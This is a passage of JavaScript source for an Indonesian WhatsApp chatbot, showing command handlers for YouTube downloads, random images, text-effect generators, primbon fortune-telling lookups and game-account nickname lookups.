                hisoka.sendImage(m.chat, media.thumb, `│➳ Title : ${media.title}\n│➳ File Size : ${media.filesizeF}\n│➳ Url : ${isUrl(text)}\n│➳ Ext : MP3\n│➳ Resolusi : ${args[1] || '128kbps'}`, m)
                hisoka.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
            }
            break
            case 'ytmp4': case 'ytvideo': {
            if (!isCreator) return
                let { ytv } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
                let quality = args[1] ? args[1] : '360p'
                let media = await ytv(text, quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                hisoka.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `│➳ Title : ${media.title}\n│➳ File Size : ${media.filesizeF}\n│➳ Url : ${isUrl(text)}\n│➳ Ext : MP3\n│➳ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
            }
            break
	    case 'getmusic': {
                let { yta } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} 1`
                if (!m.quoted) return m.reply('Reply Pesan')
                if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
		let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
                if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
                let quality = args[1] ? args[1] : '128kbps'
                let media = await yta(urls[text - 1], quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                hisoka.sendImage(m.chat, media.thumb, `│➳ Title : ${media.title}\n│➳ File Size : ${media.filesizeF}\n│➳ Url : ${urls[text - 1]}\n│➳ Ext : MP3\n│➳ Resolusi : ${args[1] || '128kbps'}`, m)
                hisoka.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
            }
            break
            case 'getvideo': {
                let { ytv } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} 1`
                if (!m.quoted) return m.reply('Reply Pesan')
                if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
                let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
                if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
                let quality = args[1] ? args[1] : '360p'
                let media = await ytv(urls[text - 1], quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                hisoka.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `│➳ Title : ${media.title}\n│➳ File Size : ${media.filesizeF}\n│➳ Url : ${urls[text - 1]}\n│➳ Ext : MP3\n│➳ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
            }
            break
            case 'pinterest': {
                m.reply(mess.wait)
		let { pinterest } = require('./lib/scraper')
                anu = await pinterest(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                hisoka.sendMessage(m.chat, { image: { url: result }, caption: '│➳ Media Url : '+result }, { quoted: m })
            }
            break
            case 'anime': case 'waifu': case 'husbu': case 'neko': case 'shinobu': case 'megumin': case 'waifus': case 'nekos': case 'trap': case 'blowjob': {
            if (!isCreator) return
                m.reply(mess.wait)
                hisoka.sendMessage(m.chat, { image: { url: api('zenz', '/api/random/'+command, {}, 'apikey') }, caption: 'Generate Random ' + command }, { quoted: m })
            }
            break
	    case 'couple': {
                m.reply(mess.wait)
                let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                hisoka.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: m })
                hisoka.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: m })
            }
	    break
            case 'coffe': case 'kopi': {
            let buttons = [
                    {buttonId: `coffe`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: 'https://coffee.alexflipnote.dev/random' },
                    caption: `☕ Random Coffe`,
                    footer: hisoka.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'wallpaper': {
                if (!text) throw 'Masukkan Query Title'
		let { wallpaper } = require('./lib/scraper')
                anu = await wallpaper(text)
                result = anu[Math.floor(Math.random() * anu.length)]
		let buttons = [
                    {buttonId: `wallpaper ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image[0] },
                    caption: `│➳ Title : ${result.title}\n│➳ Category : ${result.type}\n│➳ Detail : ${result.source}\n│➳ Media Url : ${result.image[2] || result.image[1] || result.image[0]}`,
                    footer: hisoka.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'wikimedia': {
                if (!text) throw 'Masukkan Query Title'
		let { wikimedia } = require('./lib/scraper')
                anu = await wikimedia(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                let buttons = [
                    {buttonId: `wikimedia ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image },
                    caption: `│➳ Title : ${result.title}\n│➳ Source : ${result.source}\n│➳ Media Url : ${result.image}`,
                    footer: hisoka.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'quotesanime': case 'quoteanime': {
		let { quotesAnime } = require('./lib/scraper')
                let anu = await quotesAnime()
                result = anu[Math.floor(Math.random() * anu.length)]
                let buttons = [
                    {buttonId: `quotesanime`, buttonText: {displayText: 'Next'}, type: 1}
                ]
                let buttonMessage = {
                    text: `~_${result.quotes}_\n\nBy '${result.karakter}', ${result.anime}\n\n- ${result.up_at}`,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 2
                }
                hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
	        case 'motivasi': case 'dilanquote': case 'bucinquote': case 'katasenja': case 'puisi': {
                let anu = await fetchJson(api('zenz', '/api/'+command, {}, 'apikey'))
                let buttons = [
                    {buttonId: `motivasi`, buttonText: {displayText: 'Next'}, type: 1}
                ]
                let buttonMessage = {
                    text: anu.result.message,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 2
                }
                hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case '3dchristmas': case '3ddeepsea': case 'americanflag': case '3dscifi': case '3drainbow': case '3dwaterpipe': case 'halloweenskeleton': case 'sketch': case 'bluecircuit': case 'space': case 'metallic': case 'fiction': case 'greenhorror': case 'transformer': case 'berry': case 'thunder': case 'magma': case '3dcrackedstone': case '3dneonlight': case 'impressiveglitch': case 'naturalleaves': case 'fireworksparkle': case 'matrix': case 'dropwater':  case 'harrypotter': case 'foggywindow': case 'neondevils': case 'christmasholiday': case '3dgradient': case 'blackpink': case 'gluetext': {
                if (!text) throw `Example : ${prefix + command} text`
                m.reply(mess.wait)
                hisoka.sendMessage(m.chat, { image: { url: api('zenz', '/textpro/' + command, { text: text }, 'apikey') }, caption: `Text Pro ${command}` }, { quoted: m})
	    }
            break
	    case 'shadow': case 'romantic': case 'smoke': case 'burnpapper': case 'naruto': case 'lovemsg': case 'grassmsg': case 'lovetext': case 'coffecup': case 'butterfly': case 'harrypotter': case 'retrolol': {
                if (!text) throw 'No Query Text'
                m.reply(mess.wait)
                hisoka.sendMessage(m.chat, { image: { url: api('zenz', '/photooxy/' + command, { text: text }, 'apikey') }, caption: `Photo Oxy ${command}` }, { quoted: m })
            }
            break
            case 'ffcover': case 'crossfire': case 'galaxy': case 'glass': case 'neon': case 'beach': case 'blackpink': case 'igcertificate': case 'ytcertificate': {
                if (!text) throw 'No Query Text'
                m.reply(mess.wait)
                hisoka.sendMessage(m.chat, { image: { url: api('zenz', '/ephoto/' + command, { text: text }, 'apikey') }, caption: `Ephoto ${command}` }, { quoted: m })
            }
            break
	    case 'nomerhoki': case 'nomorhoki': {
                if (!Number(text)) throw `Example : ${prefix + command} 6288292024190`
                let anu = await primbon.nomer_hoki(Number(text))
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│➳ *Nomor HP :* ${anu.message.nomer_hp}\n│➳ *Angka Shuzi :* ${anu.message.angka_shuzi}\n│➳ *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n│➳ *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, m)
            }
            break
            case 'artimimpi': case 'tafsirmimpi': {
                if (!text) throw `Example : ${prefix + command} belanja`
                let anu = await primbon.tafsir_mimpi(text)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│➳ *Mimpi :* ${anu.message.mimpi}\n│➳ *Arti :* ${anu.message.arti}\n│➳ *Solusi :* ${anu.message.solusi}`, m)
            }
            break
            case 'ramalanjodoh': case 'ramaljodoh': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│➳ *Nama Anda :* ${anu.message.nama_anda.nama}\n│➳ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n│➳ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n│➳ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n│➳ *Hasil :* ${anu.message.result}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalanjodohbali': case 'ramaljodohbali': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│➳ *Nama Anda :* ${anu.message.nama_anda.nama}\n│➳ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n│➳ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n│➳ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n│➳ *Hasil :* ${anu.message.result}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'suamiistri': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│➳ *Nama Suami :* ${anu.message.suami.nama}\n│➳ *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n│➳ *Nama Istri :* ${anu.message.istri.nama}\n│➳ *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n│➳ *Hasil :* ${anu.message.result}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalancinta': case 'ramalcinta': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│➳ *Nama Anda :* ${anu.message.nama_anda.nama}\n│➳ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n│➳ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n│➳ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n│➳ *Sisi Positif :* ${anu.message.sisi_positif}\n│➳ *Sisi Negatif :* ${anu.message.sisi_negatif}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'artinama': {
                if (!text) throw `Example : ${prefix + command} Dika Ardianta`
                let anu = await primbon.arti_nama(text)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│➳ *Nama :* ${anu.message.nama}\n│➳ *Arti :* ${anu.message.arti}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'kecocokannama': case 'cocoknama': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│➳ *Nama :* ${anu.message.nama}\n│➳ *Lahir :* ${anu.message.tgl_lahir}\n│➳ *Life Path :* ${anu.message.life_path}\n│➳ *Destiny :* ${anu.message.destiny}\n│➳ *Destiny Desire :* ${anu.message.destiny_desire}\n│➳ *Personality :* ${anu.message.personality}\n│➳ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
            }
            break
            case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
                if (!text) throw `Example : ${prefix + command} Dika|Novia`
                let [nama1, nama2] = text.split`|`
                let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendImage(m.chat,  anu.message.gambar, `│➳ *Nama Anda :* ${anu.message.nama_anda}\n│➳ *Nama Pasangan :* ${anu.message.nama_pasangan}\n│➳ *Sisi Positif :* ${anu.message.sisi_positif}\n│➳ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
            }
            break
            case 'jadianpernikahan': case 'jadiannikah': {
                if (!text) throw `Example : ${prefix + command} 6, 12, 2020`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│➳ *Tanggal Pernikahan :* ${anu.message.tanggal}\n│➳ *karakteristik :* ${anu.message.karakteristik}`, m)
            }
            break
            case 'sifatusaha': {
                if (!ext)throw `Example : ${prefix+ command} 28, 12, 2021`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│➳ *Lahir :* ${anu.message.hari_lahir}\n│➳ *Usaha :* ${anu.message.usaha}`, m)
            }
            break
            case 'rejeki': case 'rezeki': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│➳ *Lahir :* ${anu.message.hari_lahir}\n│➳ *Rezeki :* ${anu.message.rejeki}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'pekerjaan': case 'kerja': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│➳ *Lahir :* ${anu.message.hari_lahir}\n│➳ *Pekerjaan :* ${anu.message.pekerjaan}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalannasib': case 'ramalnasib': case 'nasib': {
                if (!text) throw `Example : 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.ramalan_nasib(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│➳ *Analisa :* ${anu.message.analisa}\n│➳ *Angka Akar :* ${anu.message.angka_akar}\n│➳ *Sifat :* ${anu.message.sifat}\n│➳ *Elemen :* ${anu.message.elemen}\n│➳ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
            }
            break
            case 'potensipenyakit': case 'penyakit': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│➳ *Analisa :* ${anu.message.analisa}\n│➳ *Sektor :* ${anu.message.sektor}\n│➳ *Elemen :* ${anu.message.elemen}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'artitarot': case 'tarot': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendImage(m.chat, anu.message.image, `│➳ *Lahir :* ${anu.message.tgl_lahir}\n│➳ *Simbol Tarot :* ${anu.message.simbol_tarot}\n│➳ *Arti :* ${anu.message.arti}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'fengshui': {
                if (!text) throw `Example : ${prefix + command} Dika, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
                let [nama, gender, tahun] = text.split`,`
                let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│➳ *Nama :* ${anu.message.nama}\n│➳ *Lahir :* ${anu.message.tahun_lahir}\n│➳ *Gender :* ${anu.message.jenis_kelamin}\n│➳ *Angka Kua :* ${anu.message.angka_kua}\n│➳ *Kelompok :* ${anu.message.kelompok}\n│➳ *Karakter :* ${anu.message.karakter}\n│➳ *Sektor Baik :* ${anu.message.sektor_baik}\n│➳ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
            }
            break
            case 'haribaik': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.petung_hari_baik(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│➳ *Lahir :* ${anu.message.tgl_lahir}\n│➳ *Kala Tinantang :* ${anu.message.kala_tinantang}\n│➳ *Info :* ${anu.message.info}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harisangar': case 'taliwangke': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│➳ *Lahir :* ${anu.message.tgl_lahir}\n│➳ *Hasil :* ${anu.message.result}\n│➳ *Info :* ${anu.message.info}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harinaas': case 'harisial': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│➳ *Hari Lahir :* ${anu.message.hari_lahir}\n│➳ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n│➳ *Hari Naas :* ${anu.message.hari_naas}\n│➳ *Info :* ${anu.message.catatan}\n│➳ *Catatan :* ${anu.message.info}`, m)
            }
            break
            case 'nagahari': case 'harinaga': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│➳ *Hari Lahir :* ${anu.message.hari_lahir}\n│➳ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n│➳ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'arahrejeki': case 'arahrezeki': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│➳ *Hari Lahir :* ${anu.message.hari_lahir}\n│➳ *tanggal Lahir :* ${anu.message.tgl_lahir}\n│➳ *Arah Rezeki :* ${anu.message.arah_rejeki}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'peruntungan': {
                if (!text) throw `Example : ${prefix + command} DIka, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
                let [nama, tgl, bln, thn, untuk] = text.split`,`
                let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│➳ *Nama :* ${anu.message.nama}\n│➳ *Lahir :* ${anu.message.tgl_lahir}\n│➳ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n│➳ *Hasil :* ${anu.message.result}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'weton': case 'wetonjawa': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.weton_jawa(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│➳ *Tanggal :* ${anu.message.tanggal}\n│➳ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n│➳ *Watak Hari :* ${anu.message.watak_hari}\n│➳ *Naga Hari :* ${anu.message.naga_hari}\n│➳ *Jam Baik :* ${anu.message.jam_baik}\n│➳ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
            }
            break
            case 'sifat': case 'karakter': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│➳ *Nama :* ${anu.message.nama}\n│➳ *Lahir :* ${anu.message.tgl_lahir}\n│➳ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
            }
            break
            case 'keberuntungan': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│➳ *Nama :* ${anu.message.nama}\n│➳ *Lahir :* ${anu.message.tgl_lahir}\n│➳ *Hasil :* ${anu.message.result}`, m)
            }
            break
            case 'memancing': {
                if (!text) throw `Example : ${prefix + command} 12, 1, 2022`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│➳ *Tanggal :* ${anu.message.tgl_memancing}\n│➳ *Hasil :* ${anu.message.result}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'masasubur': {
                if (!text) throw `Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
                let [tgl, bln, thn, siklus] = text.split`,`
                let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│➳ *Hasil :* ${anu.message.result}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'zodiak': case 'zodiac': {
                if (!text) throw `Example : ${prefix+ command} 7 7 2005`
                let zodiak = [
                    ["capricorn", new Date(1970, 0, 1)],
                    ["aquarius", new Date(1970, 0, 20)],
                    ["pisces", new Date(1970, 1, 19)],
                    ["aries", new Date(1970, 2, 21)],
                    ["taurus", new Date(1970, 3, 21)],
                    ["gemini", new Date(1970, 4, 21)],
                    ["cancer", new Date(1970, 5, 22)],
                    ["leo", new Date(1970, 6, 23)],
                    ["virgo", new Date(1970, 7, 23)],
                    ["libra", new Date(1970, 8, 23)],
                    ["scorpio", new Date(1970, 9, 23)],
                    ["sagittarius", new Date(1970, 10, 22)],
                    ["capricorn", new Date(1970, 11, 22)]
                ].reverse()

                function getZodiac(month, day) {
                    let d = new Date(1970, month - 1, day)
                    return zodiak.find(([_,_d]) => d >= _d)[0]
                }
                let date = new Date(text)
                if (date == 'Invalid Date') throw date
                let d = new Date()
                let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
                let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]

                let zodiac = await getZodiac(birth[1], birth[2])
                
                let anu = await primbon.zodiak(zodiac)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│➳ *Zodiak :* ${anu.message.zodiak}\n│➳ *Nomor :* ${anu.message.nomor_keberuntungan}\n│➳ *Aroma :* ${anu.message.aroma_keberuntungan}\n│➳ *Planet :* ${anu.message.planet_yang_mengitari}\n│➳ *Bunga :* ${anu.message.bunga_keberuntungan}\n│➳ *Warna :* ${anu.message.warna_keberuntungan}\n│➳ *Batu :* ${anu.message.batu_keberuntungan}\n│➳ *Elemen :* ${anu.message.elemen_keberuntungan}\n│➳ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'shio': {
                if (!text) throw `Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`
                let anu = await primbon.shio(text)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│➳ *Hasil :* ${anu.message}`, m)
            }
            break
	    case 'stalker': case 'stalk': {
		if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply('Limit Harian Anda Telah Habis')
                if (!text) return m.reply(`Example : ${prefix +command} type id\n\nList Type :\n1. ff (Free Fire)\n2. ml (Mobile Legends)\n3. aov (Arena Of Valor)\n4. cod (Call Of Duty)\n5. pb (point Blank)\n6. ig (Instagram)\n7. npm (https://npmjs.com)`)
                let [type, id, zone] = args
                if (type.toLowerCase() == 'ff') {
                    if (!id) throw `No Query id, Example ${prefix + command} ff 552992060`
                    let anu = await fetchJson(api('zenz', '/api/nickff', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'ml') {
                    if (!id) throw `No Query id, Example : ${prefix + command} ml 214885010 2253`
                    if (!zone) throw `No Query id, Example : ${prefix + command} ml 214885010 2253`
                    let anu = await fetchJson(api('zenz', '/api/nickml', { apikey: global.APIKeys[global.APIs['zenz']], query: id, query2: zone }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nZone : ${anu.result.zoneId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'aov') {
                    if (!id) throw `No Query id, Example ${prefix + command} aov 293306941441181`
                    let anu = await fetchJson(api('zenz', '/api/nickaov', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'cod') {
                    if (!id) throw `No Query id, Example ${prefix + command} cod 6290150021186841472`
                    let anu = await fetchJson(api('zenz', '/api/nickcod', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'pb') {
                    if (!id) throw `No Query id, Example ${prefix + command} pb riio46`
                    let anu = await fetchJson(api('zenz', '/api/nickpb', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'ig') {
                    if (!id) throw `No Query username, Example : ${prefix + command} ig cak_haho`
                    let { result: anu } = await fetchJson(api('zenz', '/api/stalker/ig', { username: id }, 'apikey'))
                    if (anu.status == false) return m.reply(anu.result.message)
